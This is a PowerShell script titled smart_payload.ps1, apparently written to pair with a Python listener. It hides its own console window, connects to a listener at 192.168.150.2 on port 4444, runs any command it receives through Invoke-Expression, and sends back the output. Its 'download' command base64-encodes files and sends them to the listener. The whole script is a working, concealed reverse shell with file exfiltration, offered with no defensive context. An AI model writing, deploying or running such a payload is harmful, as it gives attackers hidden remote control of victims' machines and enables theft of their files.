# smart_payload.ps1 - Compatible with smart_listener.py
$ip = "192.168.150.2"
$port = 4444

# Hide window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
' -ErrorAction SilentlyContinue

$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Connect to listener
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

# Send initial connection message
$writer.WriteLine("[+] Connected to $ip")

# Main command loop
while ($null -ne ($cmd = $reader.ReadLine())) {
    $cmd = $cmd.Trim()
    
    # Handle download command
    if ($cmd -match "^download (.+)$") {
        $filePath = $matches[1].Trim('"').Trim("'")
        
        if (Test-Path $filePath) {
            $bytes = [System.IO.File]::ReadAllBytes($filePath)
            $b64 = [Convert]::ToBase64String($bytes)
            $filename = Split-Path $filePath -Leaf
            $extension = [System.IO.Path]::GetExtension($filename)
            $size = $bytes.Length
            
            # Send file with headers that smart_listener understands
            $writer.WriteLine("FILE_START|$filename|$extension|$size")
            $writer.WriteLine($b64)
            $writer.WriteLine("FILE_END")
        } else {
            $writer.WriteLine("ERROR|File not found: $filePath")
        }
    }
    # Handle exit command
    elseif ($cmd -eq "exit") {
        break
    }
    # Execute regular PowerShell commands
    else {
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            if ($output -eq "") {
                $writer.WriteLine("[+] Command executed successfully")
            } else {
                $writer.WriteLine($output)
            }
        } catch {
            $writer.WriteLine("ERROR: $($_.Exception.Message)")
        }
    }
}

$client.Close()